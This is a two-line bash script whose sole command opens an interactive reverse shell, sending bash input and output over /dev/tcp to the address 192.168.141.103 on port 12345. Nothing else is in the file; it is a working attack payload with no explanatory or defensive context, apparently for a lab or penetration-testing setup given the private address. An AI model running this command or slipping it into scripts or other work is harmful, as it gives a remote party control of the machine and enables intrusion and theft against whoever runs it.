#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/192.168.141.103/12345 <&1'
